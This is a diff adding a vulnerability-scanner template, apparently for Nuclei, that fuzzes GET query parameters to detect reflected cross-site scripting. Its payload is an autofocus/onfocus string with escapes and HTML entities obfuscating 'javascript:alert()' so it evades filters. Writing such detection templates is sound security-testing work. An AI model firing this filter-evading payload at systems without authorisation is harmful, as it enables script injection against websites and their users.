@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-autofocus
+
+info:
+  name: Autofocus XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using an autofocus payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "autofocus onFocUs=\\'find(l\\u{6F}cati\\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)\\'"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
